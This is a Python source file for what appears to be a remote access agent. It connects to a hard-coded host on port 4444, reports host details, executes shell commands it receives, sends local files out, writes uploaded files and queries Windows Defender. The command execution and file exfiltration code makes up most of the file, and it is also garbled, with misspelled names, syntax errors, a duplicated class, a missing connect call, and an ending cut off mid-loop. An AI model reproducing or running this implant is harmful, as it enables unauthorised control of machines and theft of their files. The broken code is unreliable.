import socket
import threading
import time
import json
import os
import sys
import platform
import subprocess
import psutil
import hashlib
from datetime import datetime
import struct
import zlib
import win32com.client
import pythoncom

# Ensure the necessary library is available
try:
    import psutil
except ImportError:
    print("Error: 'psytil' library is required for full functionality.")
    sys.exit(1)
    
    
# Configuration Constants
DEFAULT_HOST = '192.168.226.2'
DEFAULT_PORT = 4444
BUFFER_SIZE = 4096
SOCKET_TIMEOUT = 10


class SystemManager:
    def __init__(self, comm_header):
        self.comm = comm_header
        # Initialize COM for Defender interactions
        pythoncom.CoInitialize()
        
    def __del__(self):
        pythoncom.CoUninitialize()
        
    def _get_defender_controller(self):
        """
        Creates the WMI connection object for Windows Defender.
        """
        try:
            # Connect to the Windows Security Center namespace
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            return swbemServices.ExecQuery("Select * FROM MSFT_MyComputerStatus")[0]
        except Exception as e:
            print(f"[DEFENDER] Error accessing Defender: {e}")
            return None
            
    def scan_system(self, scan_type="Full"):
        """
        Initiates a system scan.
        scan_type: 'Full', 'Quick', or 'Custom'
        """
        print(f"[DEFENDER] Starting {scan_type} scan...")
        
        try:
            # Create the scan job object
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            scanJob = swbemServices.Get("MSFT_MpScan")
            
            # Configure scan parameters
            scanJob.Type = 1 if scan_type == "Full" else 0 # 1 = Full, 0 = Quick
            scanJob.RebootNeeded = 0
            
            # Start the scan
            scanJob.StartScan()
            print(f"[DEFENDER] Scan started successfully.")
            return {"status": "started", "scan_id": scanJob.Id}
            
        except Exception as e:
            print(f"[DEFENDER] Failed to start scan: {e}")
            return {"status": "failed", "error": str(e)}
            
    def check_protection_status(self):
        """
        Queries the cirrent real-time protection status.
        Return the state of Windows Defender (e.g., 'enabled', 'disabled').
        """
        try:
            status = self._get_defender_controller()
            if status:
                # Attributes very slightly by Windows version, but 'RealTimeProtectionEnabled' is standard
                is_enabled = getattr(status, 'RealTimeProtectionEnabled', False)
                return {"status": "enabled" if is_enabled else "disabled"}
            else:
                return {"status": "error"}
        except Exception as e:
            print(f"[DEFENDER] Check status error: {e}")
            return {"status": "error"}
            
    def query_threats(self):
        """
        Retrieves a list of all identified threats on the system.
        This identifies malware, worm, spyware, and Trojans.
        """
        try:
            # Create the Threats collection
            swbemServices = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            colThreats = swbemServices = swbemServices.ExecQuery("Slect * FROM MSFT_MpThreat")
            
            threat_list = []
            for threat in colThreats:
                threat_info = {
                    "ThreatID": threat.ID,
                    "Name": threat.DisplayName,
                    "Severity": threat.Severity,
                    "FilePath": threat.Files[0].Path if threat.Files else "N/A",
                    "ThreatCategory": threat.ThreatCategory
                }
                threat_list.append(threat_info)
                
            # Filter results for the user's requested categories
            specific_threats = {
                "malware": [t for t in threat_list if t['ThreatCategory'] == 'Malware'],
                "worms": [t for t in threat_list if t['ThreatCategory'] == 'Worm'],
                "spyware": [t for t in threat_list if t['ThreatCategory'] == 'Spyware'],
                "trojans": [t for t in threat_list if t['ThreatCategory'] == 'Trojan'],
            }
            
            return {
                "total_threats": len(threat_list),
                "specific_categories": specific_threats,
                "raw_data": threat_list
            }
            
        except Exception as e:
            print(f"[DEFENDER] Query threats error: {e}")
            return {"status": "error": str(e)}
            
    def remove_threat(self, threat_id):
        """
        Attempts to remove a specific identified threat.
        """
        try:
            # Create the action interface
            actions = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender")
            action = actions.Get("MSFT_MpThreatAction")
            
            # Set the action to 'Remove'
            action.ThreatID = threat_id
            action.Action = 2 # 2 = Remove
            
            # Execute the action
            action.Execute()
            print(f"[DEFENDER] Threat {threat_id} removed successfully.")
            return {"status": "removed"}
            
        except Exception as e:
            print(f"[DEFENDER] Failed to remove threat: {e}")
            return {"status": "failed", "error": str(e)}
        
    def enable_protection(self):
        """
        Enables Real-Time Protection and other scanning features.
        """
        try:
            # We use the configuration namespace to modify settings
            config = win32com.client.GetObject("winmgmts:\\\\.\\root\\Microsoft\\Windows\\Defender\\Configuration")
            
            # Enable Real-Time Protection
            config.SetRealTimeProtection(1) # 1 = Enabled
            config.SetNetworkProtection(1)
            config.SetSignatureUpdateInterval(1)
            
            print(f"[DEFENDER] Protection enabled.")
            return {"status": "enabled"}
            
        except Exception as e:
            print(f"[DEFENDER] Failed to enable protection: {e}")
            return {"status": "failed", "error": str(e)}
        
    def update_defender(self):
        """
        Forces an immediate signature update for Windows Defender
        """
        try:
            status = self._get_defender_controller()
            if status:
                # This triggers the update process
                status.UpdateSignature()
                print("[DEFENDER] Signature update triggered.")
                return {"status": "update_triggered}
            else:
                return {"status": "error"}
        except Exception as e:
            print(f"[DEFENDER] Update error: {e}")
            return {"status": "error"}

class CommunicationHandler:
    """
    Manages the socket connection, serialization, and deserialization of messages
    between the client and the server.
    """
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.socket = None
        self.is_connected = False
        self.session_id = str(int(time.time()))
        
    def establish_connection(self):
        """
        Attempts to connect to the server with a retry mechanism.
        """
        attempts = 0
        max_attempts = 3
        
        while attempts < max_attempts and not self.is_connected:
            try:
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.settimeout(SOCKET_TIMEOUT)
                self.is_connected = True
                
                # Send initial handshake with metadata
                metadata = {
                    "agent_id": self.session_id,
                    "hostname": platform.node(),
                    "os_version": platform.system() + " " + platform.release(),
                    "cpu_cores": psutil.cpu_count(),
                    "timestamp": daterime.now().isoformat()
                }
                self.send_data(metadata, "handshake")
                
                print(f"[SYSTEM] Connected to server at {self.host}:{self.port}")
                
            except ConnectionRefusedError:
                attempts += 1
                print(f"[SYSTEM] Connection attempt {attempts} failed. Retrying in 5s...")
                time.sleep(5)
            except Exception as e:
                print(f"[SYSTEM] Connection error: {e}")
                self.is_connected = False
                break
                
        return self.is_connected
        
    def send_data(self, data, packet_type):
        """
        Packs data into a JSON string, add a header, and sends its over the socket.
        """
        if not self.is_connected:
            return False
            
        try:
            json_str = json.dumps(data)
            # Compress data to save bandwidth
            compressed_data = zlib.compress(json_str.encode('utf-8'))
            
            # Create packet header
            header = struct.pack('!I', len(compressed_data))
            type_byte = struct.pack('!B', self._get_packet_type_id(packet_type))
            
            # Send header + pl
            self.socket.sendall(header + type_byte + compressed_data)
            return True
            
        except Exception as e:
            print(f"[COMM] Send error: {e}")
            self.handle_disconnect()
            return False
            
    def receive_data(self):
        """
        Reads data from the socket. Handles fragmentation if necessary.
        """
        if not self.is_connected:
            return None
            
        try:
            # Read header first (4 bytes for length)
            header = self._receive_exact(BUFFER_SIZE)
            if not header:
                return None
                
            data_length = struct.unpack('I', header)[0]
            
            # Read type byte (1 byte)
            type_byte = self._receive_exact(1)
            if not type_byte:
                return None
                
            packet_type = self._get_packet_type_from_id(type_byte[0])
            
            # Read payload
            payload = self._receive_exact(data_length)
            if not payload:
                return None
                
            # Decompress payload
            decompressed_json = zlib.decompress(payload).decode('utf-8')
            return json.loads(decompressed_json), packet_type
            
        except Exception as e:
            print(f"[COMM] Receive error: {e}")
            self.handle_disconnect()
            return None
            
    def _receive_exact(self, size):
        """Helper to receive exacly 'size' bytes."""
        data = bytearray()
        while len(data) < size:
            packet = self.socket.recv(size - len(data))
            if not packet:
                return None
            data.extend(packet)
        return bytes(data)
        
    def _get_packet_type_id(self, ptype):
        """Maps string types to integer IDs."""
        mapping = {
            "command": 1,
            "file_transfer": 2,
            "status": 3,
            "error": 4
        }
        return mapping.get(ptype, 0)
        
    def _get_packet_type_from_id(self, pid):
        """Maps integer IDs back to string types."""
        mapping = {
            1: "command",
            2: "file_transfer",
            3: "status",
            4: "error"
        }
        return mapping.get(pid, "unknown")
        
    def handle_disconnec(self):
        """Handles graceful disconnection attempts."""
        self.is_connected = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        print("[SYSTEM] Disconnected from server.")
        
        
class SystemManager:
    """
    Handles local system operations, file manipulation, and process control
    """
    def __init__(self, comm_handler):
        self.comm = comm_handler
        
    def gather_system_info(self):
        """Collects statistics about the target environment."""
        try:
            cpu_load = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            
            info = {
                "cpu_percent": cpu_losd,
                "memory_percent": memory.percent,
                "memory_available_gb": round(memory.available / (1024**3), 2),
                "disk_total_gb": round(disk.total / (1024**3), 2),
                "disk_used_gb": round(disk.used / (1024**3), 2),
                "disk_percent": disk.percent,
                "uptime": str(datetime.now() - datetime.fromtimestamp(psutil.boot_time()))
            }
            
            self.comm.send_data(info, "status")
            return info
            
        except Exception as e:
            print(f"[SYS] Gather info error: {e}")
            return None
            
    def list_directory(self, path='.'):
        """Recursively scans a directory for files and folders."""
        try:
            content = []
            for item in os.listdir(path):
                full_path = os.path.join(path, item)
                if os.path.isfile(full_path):
                    size = os.path.getsize(full_path)
                    content.append({"name": item, "type": "file", "size": size})
                elif os.path.isdir(full_path):
                    content.append({"name": item, "type": "directory"})
                    
            self.comm.send_data(content, "status")
            return content
            
        except Exception as e:
            print(f"[SYS] List dir error: {e}")
            return None
            
    def execute_command(self, command):
        """Executes a shell command and returns the output."""
        try:
            # Use Popen to capture output without blocking the main thread
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            stdout, stderr = process.communicate()
            
            result = {
                "return_code": process.returncode,
                "output": stdout,
                "error": stderr
            }
            
            self.comm.send_data(result, "status")
            return result
            
        except Exception as e:
            print(f"[SYS] Execute cmd error: {e}")
            return None
            
    def download_file(self, remote_path, local_path):
        try:
            if os.path.exists(remote_path):
                with open(remote_path, 'rb') as f:
                    file_data = f.read()
                    
                # Send metadata and file content
                file_metadata = {
                    "path": remote_path,
                    "size": len(file_data)
                }
                
                self.comm.send_data(file_metadata, "file_transfer")
                
                # Send file data in chunks
                chink_size = 1024 * 1024 # 1MB chunks
                for i in range(0, len(file_data), chunk_size):
                    chunk = file_data[i:i + chunk_size]
                    self.comm.send_data(chunk, "file_transfer")
                    
                print(f"[SYS] File sent: {remote_path}")
                return True
            else:
                print(f"[SYS] File not found: {remote_path}")
                self.comm.send_data({"error": "File not found"}, error")
                return False
                
        except Exception as e:
            print(f"[SYS] Download error: {e}")
            return False
            
    def upload_file(self, remote_path, file_content):
        """Save file content to the client."""
        try:
            with open(remote_path, 'wb') as f:
                f.write(file_content)
            print(f"[SYS] File saved: {remote_path}")
            self.comm.send_data({"success": True, "path": remote_path}, "status")
            return True
        except Exception as e:
            print(f"[SYS] Upload error: {e}")
            return False
            
            
class OperationCore:
    """
    The main controller that handles the execution loop and command parsing.
    
    orchestrates the interaction between the communication handler and the system manager.
    It maintains a persistent connection and processes incoming instructions.
    """
    def __init__(self, host, port):
        self.comm = CommunicationHandler(host, port)
        self.sys_mgr = SystemManager(self.comm)
        self.running = True
        
    def start(self):
        """Initializes the connection and begins the operation loop."""
        print("[CORE] Initializing Operation Core...")
        
        if not self.comm.establish_connection():
            print("[CORE] Failed to connect. Exiting.")
            return
            
        # Initial heartbeat
        self.sys_mgr.gather_system_info()
        
        while self.running and self.comm.is_connected:
            # Wait for incoming command
            data, packet_type = self.comm.receive_data()